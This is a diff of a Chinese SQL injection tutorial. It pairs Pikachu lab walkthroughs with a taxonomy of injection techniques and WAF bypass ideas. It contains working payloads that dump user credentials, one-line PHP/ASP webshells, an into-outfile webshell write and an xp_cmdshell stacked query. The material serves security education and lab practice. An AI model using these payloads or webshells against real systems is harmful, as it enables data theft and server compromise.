@@ -1,460 +1,396 @@
 
-# 概述
-在owasp发布的top10排行榜里，注入漏洞一直是危害排名第一的漏洞，其中注入漏洞里面首当其冲的就是数据库注入漏洞。**一个严重的SQL注入漏洞，可能会直接导致一家公司破产！**
+# 一、SQL注入原理
+SQL注入就是指Web应用程序**对用户输入数据的合法性没有判断，前端传入后端的参数是攻击者可控的，并且参数带入数据库查询，攻击者可以通过构造不同的**SQL语句来实现对数据库的任意操作。	
 
-SQL注入漏洞主要形成的原因是在数据交互中，前端的数据传入到后台处理时，没有做严格的判断，导致其传入的“数据”拼接到SQL语句中后，被当作SQL语句的一部分执行。从而导致数据库受损（被脱裤、被删除、甚至整个服务器权限沦陷）。
+**sql注入漏洞的产生需要满足以下两个条件：**
 
-在构建代码时，一般会从如下几个方面的策略来防止SQL注入漏洞：<br />1.对传进SQL语句里面的变量进行过滤，不允许危险字符传入；<br />2.使用参数化（Parameterized Query 或 Parameterized Statement）；<br />3.还有就是,目前有很多ORM框架会自动使用参数化解决注入问题,但其也提供了"拼接"的方式,所以使用时需要慎重!
+1. 参数用户可控：前端传给后端的参数内容是用户可以控制的。
+2. 参数代入数据库查询：传入的参数拼接到SQL语句，且带入数据库查询。
 
+假设后端代码的SQL语句为：`$query = "SELECT * FROM users WHERE id = $_ GET['id']";`
 
-# 数字型注入(POST)
+1. 当传入的参数为`1'`时
 
-## 查看关键代码
-```php
-$link=connect();
-$html='';
+查询语句为：`SELECT * FROM users WHERE id = 1'`这不符合规范，报错。
 
-if(isset($_POST['submit']) && $_POST['id']!=null){
-    //这里没有做任何处理，直接拼到select里面去了,形成Sql注入
-    $id=$_POST['id'];
-    $query="select username,email from member where id=$id";
-    $result=execute($link, $query);
-    //这里如果用==1,会严格一点
-    if(mysqli_num_rows($result)>=1){
-        while($data=mysqli_fetch_assoc($result)){
-            $username=$data['username'];
-            $email=$data['email'];
-            $html.="<p class='notice'>hello,{$username} <br />your email is: {$email}</p>";
-        }
-    }else{
-        $html.="<p class='notice'>您输入的user id不存在，请重新输入！</p>";
-    }
-}
-```
+2. 当传入的参数为`1 and 1 = 1`时
 
-通过代码可看到这里没有做任何处理，直接拼到select里面去了,形成Sql注入。
+查询语句为：`SELECT * FROM users WHERE id = 1 and 1 = 1`。<br />因为`1=1`为真，且where语句中`id=1`也为真，所以页面会返回与`id=1`相同的结果。
 
-## 函数说明
-```
-isset() 函数用于检测变量是否已设置并且非 NULL。如果指定变量存在且不为 NULL，则返回 TRUE，否则返回 FALSE
+3. 当传入的ID参数为`and 1=2`时，由于`1=2`不成立，所以返回假，页面就会返回与`id=1`不同的结果。
 
-语法
-bool isset ( mixed $var [, mixed $... ] )
-$var：要检测的变量。
-```
+由此可以初步判断ID参数存在SQL注入漏洞,攻击者可以进一步拼接SQL语句进行攻击，致使数据库信息泄露，甚至进一步获取服务器权限等。
 
-```
-mysqli_affected_rows() 函数返回前一次 MySQL 操作（SELECT、INSERT、UPDATE、REPLACE、DELETE）所影响的记录行数。一个 > 0 的整数表示所影响的记录行数。0 表示没有受影响的记录。-1 表示查询返回错误。
 
-语法
-mysqli_affected_rows(connection);
-connection	必需。规定要使用的 MySQL 连接。
-```
+## 1.1、万能密码
+假设现在有一个SQL语句：`String sql = "select count(*) from admin where username = '" + admin.getUsername()+"' and password = '"admin.gitPassword() + "'";`<br />我们输入`' or 1=1--`得到<br />`select count(*) from admin where username = '' or 1=1--' and password = ' '`<br />这里password就起不到作用了，因为它被注释掉了，而且`username = '' or 1=1`永远为真。
 
-```
-mysqli_fetch_assoc() 函数从结果集中取得一行作为关联数组。返回代表读取行的关联数组。如果结果集中没有更多的行则返回 NULL。
 
-语法
-mysqli_fetch_assoc(result);
-result	必需。规定由 mysqli_query()、mysqli_store_result() 或 mysqli_use_result() 返回的结果集标识符。
-```
+## 1.2、SQL注入的危害
 
+- 数据库内的信息全部被外界窃取
+- 数据库中的内容被篡改 登录认证被绕过（应用程序登录不需要用户名和密码） 
+- 其他，例如服务器上的文件被读取或修改、服务器上的程序被执行等
 
-## 实战
-随意选择一个值使用burpsuite抓包，将抓到的包发送到Repeater<br />![image-20210702162348128.png](_img/02-Web安全/1655882307743-a9d029f1-2749-444b-acf2-5e35351ed8e4.png)
 
-输入
-```
-id=1'
-```
+# 二、SQL注入的分类
 
-报错，说明存在注入<br />![image-20210702164222778.png](_img/02-Web安全/1655882315911-f1437c7f-1607-4961-a7dd-53af1934d31d.png)
+## 2.1、按照注入类型分类
+按照注入类型分类可以将SQL注入分为**数字型注入**和**字符型注入**。
 
-判断字段数，输入
-```
-id=1 order by 3    报错
-id=1 order by 22    成功
-```
 
-说明有两个字段<br />![image-20210702164536291.png](_img/02-Web安全/1655882323439-ca0430a2-e3b0-489b-be03-ea518cfa3d0b.png)
+### 2.1.1、数字型注入
+当输入的参数为整型时，如: ID、 年龄、页码等，如果存在注入漏洞，则可以认为是数字型注入，数字型注入是最简单的一种。 
 
-查看回显字段，输入
-```
-id=-1 union select 1,2
-```
-![image-20210702164950973.png](_img/02-Web安全/1655882329100-722c9b3d-abd4-4a67-a353-d24dfd330717.png)
+假设有SQL语句为:`select * from table where id=8`<br />测试步骤如下：
 
-查看当前数据库和用户，输入
-```
-id=-1 union select database(),user()
-```
-![image-20210702165026765.png](_img/02-Web安全/1655882335669-27434202-568f-44dd-983b-32d7fa053be4.png)
+1. http://www.xxser.com/test.php?id=8'
 
-查看所有表，输入
-```
-id=-1 union select database(),group_concat(table_name) from information_schema.tables where table_schema='pikachu'
-```
-![image-20210702165309183.png](_img/02-Web安全/1655882341781-1b254f25-5918-4c22-85c9-67c99f160e48.png)
+SQL语句为: `select * from table where id=8'`，这样的语句肯定会出错，导致脚本程序无法从数据库中正常获取数据，从而使原来的页面出现异常。
 
-查看users表中的字段，输入
-```
-id=-1 union select database(),group_concat(column_name) from information_schema.columns where table_name='users'&submit=%E6%9F%A5%E8%AF%A2
-```
-![image-20210702165620696.png](_img/02-Web安全/1655882348394-0a7990aa-7383-439a-9b5a-a4a5fcdc131f.png)
+2. http://www.xxser.com/test.php?id= 8 and 1=1
 
-查看所有账户和密码，输入
-```
-id=-1 union select database(),group_concat(concat_ws('-',username,password)) from pikachu.users&submit=%E6%9F%A5%E8%AF%A2
-```
-![image-20210702165833249.png](_img/02-Web安全/1655882353866-70572232-34c9-48b6-9f75-9093e119d4c3.png)
-将md5的值进行解密即可得到密码
+SQL语句为`select * from table where id=8 and 1=1`,语句执行正常，返回数据与原始请求无任何差异。
 
+3. http://www.xxser.com/test.php?id=8 and 1=2
 
-# 字符型注入(GET)
+SQL语句变为`select * from table where id=8 and 1=2`,语句执行正常，但却无法查询出数据，因为` and 1=2 `始终为假。所以返回数据与原始请求有差异。
 
-## 查看关键代码
-```php
-$link=connect();$html='';if(isset($_GET['submit']) && $_GET['name']!=null){    //这里没有做任何处理，直接拼到select里面去了    $name=$_GET['name'];    //这里的变量是字符型，需要考虑闭合    $query="select id,email from member where username='$name'";    $result=execute($link, $query);    if(mysqli_num_rows($result)>=1){        while($data=mysqli_fetch_assoc($result)){            $id=$data['id'];            $email=$data['email'];            $html.="<p class='notice'>your uid:{$id} <br />your email is: {$email}</p>";        }    }else{        $html.="<p class='notice'>您输入的username不存在，请重新输入！</p>";    }}
-```
+如果以上三个步骤全部满足，则程序就可能存在SQL注入漏洞。
 
-通过代码可看到这里依然是没有做任何处理，直接拼到select里面去了,形成Sql注入。
+这种数字型注入最多出现在ASP、PHP等弱类型语言中,弱类型语言会自动推导变量类型，例如，参数id=8, PHP会自动推导变量id的数据类型为int类型，那么id=8 and 1=1,则会推导为string 类型，这是弱类型语言的特性。而对于Java、C#这类强类型语言，如果试图把一个字符串转换为int类型，则会抛出异常，无法继续执行。所以，强类型的语言很少存在数字型注入漏洞，强类型语言在这方面比弱类型语言有优势。
 
 
-## 实战
-SQL注入详情可以看sqli-labs系类，这里不进行详细叙述，直接爆账号和密码了。
+### 2.1.2、字符型注入
+当输入参数为字符串时，称为字符型。数字型与字符型注入最大的区别在于数字类型不需要单引号闭合，而字符串类型一般要使用单引号来闭合。
 
-输入
-```
-XMTX' union select database(),group_concat(concat_ws('-',username,password)) from pikachu.users --
-```
-![image-20210702171301945.png](_img/02-Web安全/1655882378711-3f20be5d-40b0-4a07-8d01-5c2dfb9d619e.png)
-将md5的值进行解密即可得到密码
+- 数字型例句：`select * from table where id =8`
+- 字符型例句如下：`select * from table where use rname= 'admin '`
 
+字符型注入最关键的是如何闭合SQL语句以及注释多余的代码。
 
-# 搜索型注入
+假设SQL 代码如下:`select * from table where username = 'admin'`
 
-## 查看关键源码
-```php
-$link=connect();$html1='';$html2='';if(isset($_GET['submit']) && $_GET['name']!=null){    //这里没有做任何处理，直接拼到select里面去了    $name=$_GET['name'];    //这里的变量是模糊匹配，需要考虑闭合    $query="select username,id,email from member where username like '%$name%'";    $result=execute($link, $query);    if(mysqli_num_rows($result)>=1){        //彩蛋:这里还有个xss        $html2.="<p class='notice'>用户名中含有{$_GET['name']}的结果如下：<br />";        while($data=mysqli_fetch_assoc($result)){            $uname=$data['username'];            $id=$data['id'];            $email=$data['email'];            $html1.="<p class='notice'>username：{$uname}<br />uid:{$id} <br />email is: {$email}</p>";        }    }else{        $html1.="<p class='notice'>0o。..没有搜索到你输入的信息！</p>";    }}
-```
+1. 如果输入`admin and 1=1`
 
-通过代码可看到这里依然是没有做任何处理，直接拼到select里面去了,形成Sql注入，不过这里有一个闭合的问题。
+则SQL语句为：`select * from table where username ='admin and 1=1'`<br />这时想要进行注入，则必须注意字符串闭合问题。
 
+2. 如果输入`admin' and 1=1--`
 
-## 实战
-判断注入点，输入
-```
-XMTX'     报错XMTX'--   成功
-```
+则SQL语句为：`select * from table where username ='admin' and 1=1 --'`<br />只要是字符串类型注入，都必须闭合单引号以及注释多余的代码。
 
-说明存在注入<br />![image-20210702172050800.png](_img/02-Web安全/1655882397993-cb2903cd-9ebb-44ca-80c5-b54f0e174b83.png)
+假设SQL 代码如下:<br />`update Person set use rname= ' username ' ,set password= 'password' where id=1`<br />现在对该SQL语句进行注入，就需要闭合单引号，可以在username或password处插入语<br />句为`'+(select @@version)+'`最终执行的SQL语句为: .<br />`update person set username= ' username ' , set password=''+ (select @@version)+ '' where id=1`
 
-查看字段数，输入
-```
-XMTX' order by 3--   成功 XMTX' order by 4--   报错
-```
+数据库不同，字符串连接符也不同，如SQL Server连接符号为`+`，Oracle 连接符为`||`，MySQL连接符为空格。
 
-说明有三个字段<br />![image-20210702172311470.png](_img/02-Web安全/1655882404034-285c2846-43e9-49ef-bef3-9a650f2ccf78.png)
 
-查看回显字段，输入
-```
-XMTX' union select 1,2,3--
-```
-![image-20210702172443564.png](_img/02-Web安全/1655882410347-3ac62e44-1f48-42f2-8daa-6a32b8ec1d06.png)
+## 2.2、按照注入位置分类
 
-SQL注入详情可以看sqli-labs系类，这里不进行详细叙述，直接爆账号和密码了。
-```
-XMTX' union select 1,database(),group_concat(concat_ws('-',username,password)) from pikachu.users --
-```
-![image-20210702172551759.png](_img/02-Web安全/1655882417047-9bb2ee61-c40c-4bbe-92b9-dacaf962f1da.png)
-将md5的值进行解密即可得到密码
+### 2.2.1、Union注入
+**以MySQL为例**<br />在MySQL 5.0版本之后，默认在数据库中存放一个“information_schema”的数据库，在该库中需要记住三个表名，分别是“schemata”、“tables”、“columns”。
 
+- schemata表储存该用户创建的所有数据库库名，记录数据库库名字段名schema_name。
+- tables表存储该用户出创建的所有数据库的库名和表名，需要记住的数据库库名和表名的字段分别为table_schema和table_name。
+- columns表存储该用户出创建的所有数据库的库名、表名和字段名，需要记住的数据库库名、表名和字段名为table_schema、table_name和column_name。
 
-# XX型注入
+**mysql查询语句：**
 
-## 查看关键代码
-```php
-if(isset($_GET['submit']) && $_GET['name']!=null){    //这里没有做任何处理，直接拼到select里面去了    $name=$_GET['name'];    //这里的变量是字符型，需要考虑闭合    $query="select id,email from member where username=('$name')";    $result=execute($link, $query);    if(mysqli_num_rows($result)>=1){        while($data=mysqli_fetch_assoc($result)){            $id=$data['id'];            $email=$data['email'];            $html.="<p class='notice'>your uid:{$id} <br />your email is: {$email}</p>";        }    }else{        $html.="<p class='notice'>您输入的username不存在，请重新输入！</p>";    }}
-```
+- select 要查询的字段名 from 库名.表名
+- select 要查询的字段名 from 库名.表名 where 已知条件的字段名=‘已知条件的值’
+- select 要查询的字段名 from 库名.表名 where 已知条件1的字段名=‘已知条件1的值’ and 已知条件2的字段名=‘已知条件2的值’
 
-通过代码可看到这里依然是没有做任何处理，直接拼到select里面去了,形成Sql注入，不过这里有一个闭合的问题,	我们需要用到“）”。
+**limit的用法：**<br />limit 的使用格式为limit m,n 其中m是指记录开始的位置，从0开始表示第一条记录；n是指取n条记录。<br />** **<br />**需要记住的几个函数**<br />database()： 当前网站使用的数据库<br />version()： 当前MySQL的版本<br />user()： 当前MySQL的用户
 
+**注释符：**<br />在mysql中常见注释符的表达方式：#或–空格或/**/。
 
-## 实战
-判断注入点，输入
-```
-XMTX'
-```
+**练习地址：**<br />[Union注入](https://www.yuque.com/xmtxsec/network_security/mtn1df?view=doc_embed)
 
-并显示了一个“)”，说明存在注入。<br />![image-20210707081427201.png](_img/02-Web安全/1655882437591-78ac0106-e3a4-47a4-a2ed-16a4ed08529f.png)
 
-输入
-```
-XMTX')--
-```
-返回正常<br />![image-20210707081603991.png](_img/02-Web安全/1655882443420-4b1f554f-bd06-443d-b7d5-32edd53e0f32.png)
+### 2.2.2、布尔盲注
+**1.left()函数**：<br />left(database(),1)='s’<br />left(a,b)从左侧截取a的前b位，正确则返回1，错误则返回0。<br />例：left(database(),1)=‘s’; 前1位是否是s。
 
-查看字段数，输入
-```
-XMTX' order by 2--   成功 XMTX' order by 3--   报错
-```
+**2.regexp函数**：<br />select user() regexp 'r’<br />user()的结果是root，regexp为匹配root的正则表达式。<br />例：select database() regexp ‘s’; 匹配第一个字符是否是s。
 
-说明有两个字段<br />![image-20210707081721915.png](_img/02-Web安全/1655882448638-236541a2-57a6-47b4-b18a-a5ea7e5978a7.png)
+**3.like函数：**<br />select user() like 'ro%'<br />匹配与regexp相似。<br />例：select database() like ‘s%’; 匹配第一个字符是否是s。
 
-查看回显字段，输入
-```
-XMTX') union select 1,2--
-```
-![image-20210707081832873.png](_img/02-Web安全/1655882454249-51af787d-9a34-444a-97a9-77e660871b5b.png)
+**4.substr(a,b,c)函数：**<br />slelct substr() XXX<br />substr(a,b,c)从位置b开始，截取a字符串c位长度。<br />例：select substr((select database()),1,1)=‘s’; 匹配第一个字符是否是s。<br />例：select substr((select database()),1,3)=‘sec’; 匹配前三个字符是否是sec。
 
-SQL注入详情可以看sqli-labs系类，这里不进行详细叙述，直接爆账号和密码了。
-```
-XMTX' union select 1,database(),group_concat(concat_ws('-',username,password)) from pikachu.users --
-```
+**5.ascii()函数：**<br />将某个字符串转化为ascii值<br />例：select ascii(substr((select database()),1,1)); 直接回显115 或者是：<br />例：select ascii(substr((select database()),1,3))>110; 如果大于110，就会返回1，否则返回0。
 
-将md5的值进行解密即可得到密码<br />![image-20210707081919477.png](_img/02-Web安全/1655882464037-001a5099-eab9-4e6e-8470-a5176e651ab6.png)
+**6.chr(数字)或者是ord(‘字母’)**<br />使用python中的两个函数可以判断当前的ascii值是多少。
 
+**练习地址：**<br />[布尔盲注](https://www.yuque.com/xmtxsec/network_security/atpffg?view=doc_embed)
 
-# insert,update注入
 
-## 查看关键代码
-```php
-$html='';if(isset($_POST['submit'])){    if($_POST['username']!=null &&$_POST['password']!=null){//      $getdata=escape($link, $_POST);//转义        //没转义,导致注入漏洞,操作类型为insert        $getdata=$_POST;        $query="insert into member(username,pw,sex,phonenum,email,address) values('{$getdata['username']}',md5('{$getdata['password']}'),'{$getdata['sex']}','{$getdata['phonenum']}','{$getdata['email']}','{$getdata['add']}')";        $result=execute($link, $query);        if(mysqli_affected_rows($link)==1){            $html.="<p>注册成功,请返回<a href='sqli_login.php'>登录</a></p>";        }else {            $html.="<p>注册失败,请检查下数据库是否还活着</p>";        }    }else{        $html.="<p>必填项不能为空哦</p>";    }}
-```
+### 2.2.3、文件注入
+**1.into outfile 写文件**<br />例：`select 'mysql is very good’' into outfile 'text.txt';`<br />例：`select 'mysql is very good' into outfile 'D:\wamp\www\sql\Less-7\text.txt';`
 
-通过注册页面的代码可看到这里对输入的参没有进行转义来防注入， insert 注入是指我们前端注册的信息，后台会通过 insert 这个操作插入到数据库中。如果后台没对我们的输入做防 SQL 注入处理，我们就能在注册时通过拼接 SQL 注入。知道后台使用的是 insert 语句，我们一般可以通过 or 进行闭合。
+**2.load_file() 读取本地文件**<br />例：select load_file(‘D:\wamp\www\sql\Less-7\text.txt’);<br />注意事项： \ 一些特别的字符要注意使用转义字符 如：\t 、\n 等。
 
+**3.一句话木马(其中caidao是密码)**<br />php版本：`<?php @eval($_POST["caidao"]);?>` 其中caidao是密码<br />ASP版本： `<%eval request(“caidao”)%>`<br />ASP.NET版本：`<%@ Page Language=“Jscript”%><%eval(Request.Item[“caidao”],“unsafe”);%>`
 
-## 实战
-提交注册信息并使用burpsuite抓包<br />![image-20210707092906874.png](_img/02-Web安全/1655882481179-253b2aef-ef09-4f81-b1d2-1dc0763bfdb1.png)
+**练习地址：**<br />[文件注入](https://www.yuque.com/xmtxsec/network_security/fkk6nf?view=doc_embed)
 
-输入
-```
-XMTX'
-```
 
-报错，说明存在注入<br />![image-20210707093458427.png](_img/02-Web安全/1655882487289-40a18c0b-1144-4d35-84c6-e19cf976f25c.png)
+### 2.2.4、时间盲注
+**1.if(condition,A,B)**<br />if(condition,A,B)如果条件condition为true，则执行语句A，否则执行B<br />例： select if(1>2,4,5); 返回的结果是5.（如果是在mysql命令行中使用，首先要use xxx数据库才行）
 
-输入
-```
-XMTX' or updatexml(1,(concat(0x7e,database(),0x7e)),1) or '
-```
+**2.sleep()函数**<br />设置睡眠时间<br />例：sleep(5) 睡眠5秒
+
+**练习地址：**<br />[时间盲注](https://www.yuque.com/xmtxsec/network_security/yrhmaq?view=doc_embed)
+
 
-爆出当前数据库<br />![image-20210707093402851.png](_img/02-Web安全/1655882493130-ca27fbd4-e429-4543-88de-ef1e20fe376d.png)
+### 2.2.5、POST注入
+POST注入整体上和union注入的方式基本上没有差别，主要就是注入的位置不同，Union注入的位置大多在URL或输入框中是GET请求，POST注入是在请求体中。注入语法参考**Union注入知识点**。
 
-SQL注入详情可以看sqli-labs系类，这里不进行详细叙述，直接爆账号和密码了。
+**练习地址：**<br />[POST注入](https://www.yuque.com/xmtxsec/network_security/afxgit?view=doc_embed)
+
+
+### 2.2.6、报错注入
+**UPDATEXML ()函数**<br />UPDATEXML (XML_document, XPath_string, new_value);<br />第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc<br />第二个参数：XPath_string (Xpath格式的字符串)
+第三个参数：new_value，String格式，替换查找到的符合条件的数据
+
+而我们的注入语句为：
 ```
-XMTX' or updatexml(1,(concat(0x7e,(select concat_ws('-',username,password) from pikachu.users limit 0,1),0x7e)),1) or '
+select updatexml(1,concat(0x7e,(SELECT username from security.users limit 0,1),0x7e),1);
 ```
-
-这里的输出不完整是因为报错注入对输出的字符数有限制<br />![image-20210707094706502.png](_img/02-Web安全/1655882497983-a7ae6a24-6151-49e1-9984-15f93b387ac9.png)
+其中的concat()函数是将其连成一个字符串，因此不会符合XPATH_string的格式，从而出现格式错误，爆出
 
-可以输入
 ```
-XMTX' or updatexml(1,(concat(0x7e,(select username from pikachu.users limit 0,1),0x7e)),1) or 'XMTX' or updatexml(1,(concat(0x7e,(select password from pikachu.users limit 0,1),0x7e)),1) or '
+ERROR 1105 (HY000): XPATH syntax error: 'Dumb’
 ```
+其中的0x7e是ASCII编码，解码结果为~
 
-通过修改limit的参数来控制。
+**练习地址：**<br />[报错注入](https://www.yuque.com/xmtxsec/network_security/qydpde?view=doc_embed)
 
 
-# delete注入
+### 2.2.7、User-Agrnt注入
+User-Agrnt注入整体上和union注入的方式基本上没有差别，主要就是注入的位置不同，Union注入的位置大多在URL或输入框中，User-Agrnt注入是在请求头中的User-Agrnt中。注入语法参考**Union注入知识点**。
 
-## 查看关键代码
-```php
-if(array_key_exists("message",$_POST) && $_POST['message']!=null){    //插入转义    $message=escape($link, $_POST['message']);    $query="insert into message(content,time) values('$message',now())";    $result=execute($link, $query);    if(mysqli_affected_rows($link)!=1){        $html.="<p>出现异常，提交失败！</p>";    }}// if(array_key_exists('id', $_GET) && is_numeric($_GET['id'])){//没对传进来的id进行处理，导致DEL注入if(array_key_exists('id', $_GET)){    $query="delete from message where id={$_GET['id']}";    $result=execute($link, $query);    if(mysqli_affected_rows($link)==1){        header("location:sqli_del.php");    }else{        $html.="<p style='color: red'>删除失败,检查下数据库是不是挂了</p>";    }}
-```
+**练习地址：**<br />[User-Agent注入](https://www.yuque.com/xmtxsec/network_security/ugr6sy?view=doc_embed)
+
+
+### 2.2.8、Referer注入
+Referer注入整体上和union注入的方式基本上没有差别，主要就是注入的位置不同，Union注入的位置大多在URL或输入框中，Referer注入是在请求头中的Referer中。注入语法参考**Union注入知识点**。
+
+**练习地址：**<br />[Referer注入](https://www.yuque.com/xmtxsec/network_security/uxadoi?view=doc_embed)
 
-通过源码可以看到没对传进来的id进行转义处理就直接代入SQL语句中，导致DEL注入。依然是使用报错注入。
 
+### 2.2.9、Cookie注入
+	Cookie注入整体上和union注入的方式基本上没有差别，主要就是注入的位置不同，Union注入的位置大多在URL或输入框中，Cookie注入是在请求头中的Cookie中。注入语法参考**Union注入知识点**。
 
-## 函数说明
+**练习地址：**<br />[Cookie注入](https://www.yuque.com/xmtxsec/network_security/ch3buf?view=doc_embed)
+
+
+### 2.2.10、二次注入
+二次注入可以理解为，攻击者构造的恶意数据存储在数据库后，恶意数据被读取并进入到SQL查询语句所导致的注入。防御者可能在用户输入恶意数据时对其中的特殊字符进行了转义处理，但在恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中，当Web程序调用存储在数据库中的恶意数据并执行SQL查询时，就发生了SQL二次注入。
+
+**二次注入，可以概括为以下两步:**
+
+- 第一步：插入恶意数据进行数据库插入数据时，对其中的特殊字符进行了转义处理，在写入数据库的时候又保留了原来的数据。
+- 第二步：引用恶意数据开发者默认存入数据库的数据都是安全的，在进行查询时，直接从数据库中取出恶意数据，没有进行进一步的检验的处理。
+
+**练习地址：**[https://www.yuque.com/xmtxsec/blog/badfn6](https://www.yuque.com/xmtxsec/blog/badfn6)
+
+
+### 2.2.11、宽字节注入知识点
+宽字节： GB2312、GBK、GB18030、BIG5、Shift_JIS等这些都是常说的宽字节，实际上只有两字节。宽字节带来的安全问题主要是ASCII字符(一字节)的现象，即将两个ascii字符误认为是一个宽字节字符。中文、韩文、日文等均存在宽字节，英文默认都是一个字节。
+
+在使用PHP连接MySQL的时候，当设置“set character_set_client = gbk”时会导致一个编码转换的问题。
+
+**例子：**
 ```
-array_key_exists() 函数检查某个数组中是否存在指定的键名，如果键名存在则返回 true，如果键名不存在则返回 false。语法array_key_exists(key,array)key	必需。规定键名。array	必需。规定数组。
+id= 1’ 处理 1 \’ 进行编码 1%5c%27 带入sql后 id = \’ and XXXX 此时无法完成注入
+id=1%df’ 处理 1%df\’ 进行编码 1%df%5c%27 带入sql后 id =1運’ and XXX 此时存在宽字节注入漏洞
 ```
+
+**练习地址：**[https://www.yuque.com/xmtxsec/blog/hbabnt](https://www.yuque.com/xmtxsec/blog/hbabnt)
+
 
+### 2.2.12、堆叠注入知识点
+	原理：在 SQL 中，分号（;）是用来表示一条 sql 语句的结束。试想一下我们在 ; 结束一个 sql 语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而 union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于 union 或者 union all 执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。
 
-## 实战
-提交留言，然后点击删除，并使用burpsuite抓包<br />![image-20210707100804946.png](_img/02-Web安全/1655882523548-4f1ea1d7-5a32-492e-a93b-9dcee11a2495.png)
+	堆叠注入的局限性在于并不是每一个环境下都可以执行，可能受到 API 或者数据库引擎 不支持的限制，当然了权限不足也可以解释为什么攻击者无法修改数据或者调用一些程序。
+
+	虽然我们前面提到了堆叠查询可以执行任意的 sql 语句，但是这种注入方式并不是十分完美的。在我们的 web 系统中，因为代码通常只返回一个查询结果，因此，堆叠注入第二个语句产生错误或者结果只能被忽略，我们在前端界面是无法看到返回结果的。 因此，在读取数据时，我们建议使用 union（联合）注入。同时在使用堆叠注入之前， 我们也是需要知道一些数据库相关信息的，例如表名，列名等信息。
+
+**Mysql 数据库**
+```
+新建一个表 select * from users where id=1;create table test like users;
+删除上面新建的 test 表 select * from users where id=1;drop table test;
+查询数据 select * from users where id=1;select 1,2,3;
+加载文件 select * from users where id=1;select load_file(‘c:/tmpupbbn.php’);
+修改数据 select * from users where id=1;insert into users(id,username,password)values(‘100’,‘new’,‘new’);
+```
 
-输入
+**Sql server 数据库**
 ```
-id=83'
+增加数据表 select * from test;create table sc3(ss CHAR(8));
+删除数据表 select * from test;drop table sc3;
+查询数据 select 1,2,3;select * from test;
+修改数据 select * from test;update test set name=‘test’ where id=3;
+sqlserver 中最为重要的存储过程的执行 select * from test where id=1;exec master…xp_cmdshell ‘ipconfig’
 ```
 
-报错，说明存在注入<br />![image-20210707100948912.png](_img/02-Web安全/1655882530463-57fb6682-975c-48e8-8b81-edf4980b60f9.png)
+**Oracle 数据库**<br />oracle 不能使用堆叠注入
 
-输入
+**Postgresql 数据库**
 ```
-id=83+or+updatexml(1,(concat(0x7e,database(),0x7e)),1)
+新建一个表 select * from user_test;create table user_data(id DATE);
+删除上面新建的 user_data 表 select * from user_test;delete from user_data;
+查询数据 select * from user_test;select 1,2,3;
+修改数据 select * from user_test;update user_test set name=‘modify’ where name='张三 ';
 ```
 
-爆出当前数据库<br />![image-20210707101247626.png](_img/02-Web安全/1655882536266-0b89993d-272c-452b-b802-d3272f4ae8a8.png)
+**练习地址：**[https://www.yuque.com/xmtxsec/blog/udvcz1](https://www.yuque.com/xmtxsec/blog/udvcz1)
 
-SQL注入详情可以看sqli-labs系类，这里不进行详细叙述，直接爆账号和密码了。
+
+### 2.2.13、SORT注入知识点
+SQL语句中，asc是指定列按升序排列，desc则 是指定列按降序排列。
 ```
-id=83+or+updatexml(1,(concat(0x7e,(select+concat_ws('-',username,password)+from+pikachu.users+limit+0,1),0x7e)),1)
+select * from users order by 1 desc; 使用降序进行排列
+select * from users order by1 asc;使用升序进行排列
 ```
 
-这里的输出不完整是因为报错注入对输出的字符数有限制<br />![image-20210707094706502.png](_img/02-Web安全/1655882543332-b832f3e1-4f8e-48d1-8b0f-09f2b22cd0d7.png)
+```
+right() 
+select right(database(),1);
+Left() 
+select left(database(),1);
+```
 
-可以输入
+lines terminated by xxx 以xxx为结尾:
 ```
-id=83+or+updatexml(1,(concat(0x7e,(select+username+from+pikachu.users+limit+0,1),0x7e)),1)id=83+or+updatexml(1,(concat(0x7e,(select password from pikachu.users limit 0,1),0x7e)),1)
+select ‘<?php @eval($_ POST[XMTX]);?>’ into outfile 'C:\pbpstudy\PHPTutorilWWW.XMTX.pbp’ lines
+terminated by 0x363636;
 ```
 
-通过修改limit的参数来控制。
+**练习地址：**[https://www.yuque.com/xmtxsec/blog/ubdhk5](https://www.yuque.com/xmtxsec/blog/ubdhk5)
 
 
-# http header注入
+# 三、Waf绕过
 
-## 查看关键代码
-```php
-//这里把http的头信息存到数据库里面去了，但是存进去之前没有进行转义，导致SQL注入漏洞$query="insert httpinfo(userid,ipaddress,useragent,httpaccept,remoteport) values('$is_login_id','$remoteipadd','$useragent','$httpaccept','$remoteport')";$result=execute($link, $query);
-```
+## 3.1、白盒绕过
+通过源代码分析，来进行绕过。
 
-废话不多说，直接开干。
 
+## 3.2、黑盒绕过
 
-## 实战
-查看提醒可以知道账号和密码为admin/123456，输入用户名和密码登录<br />![image-20210707102548149.png](_img/02-Web安全/1655882565019-d3ff6597-9e4a-49f7-835e-3f0e8ec82472.png)
+### 3.2.1、架构层面绕过waf
 
-可以看到返回显示user-Agent，那么可以判断出user-Agent处存在SQL注入<br />将user-Agent改为`'`,报错，说明存在注入<br />![image-20210707103834516.png](_img/02-Web安全/1655882573848-06f5c596-67bb-4ebb-a5bf-b92f66d44b05.png)
+- 寻找源网站绕过waf检测主要针对的是云waf，找到源网站的真实地址，进行绕过，有点像CDN
+- 通过同网段绕过waf防护在一个网段中，可能经过的数据不会经过云waf，从而实现绕过。
 
-输入
-```
-XMTX' or updatexml(1,concat(0x7e,database(),0x7e),1) or '
-```
 
-爆出当前数据库<br />![image-20210707093402851.png](_img/02-Web安全/1655882578933-1caa84ff-3651-49c9-91d6-4c50aa8a2d2a.png)
+### 3.2.2、资源限制角度绕过waf
 
-SQL注入详情可以看sqli-labs系类，这里不进行详细叙述，直接爆账号和密码了。
-```
-XMTX' or updatexml(1,(concat(0x7e,(select concat_ws('-',username,password) from pikachu.users limit 0,1),0x7e)),1) or '
-```
+- 一般waf的执行需要优先考虑业务优先的原则，所以对于构造较大、超大数据包可能不会进行检测，从而实现绕过waf。
 
-这里的输出不完整是因为报错注入对输出的字符数有限制<br />![image-20210707094706502.png](_img/02-Web安全/1655882583608-11351106-5ca4-4659-aad9-c5ff5c219e3c.png)
 
-可以输入
-```
-XMTX' or updatexml(1,(concat(0x7e,(select username from pikachu.users limit 0,1),0x7e)),1) or 'XMTX' or updatexml(1,(concat(0x7e,(select password from pikachu.users limit 0,1),0x7e)),1) or '
-```
+### 3.2.3、协议层面绕过waf
 
-通过修改limit的参数来控制。
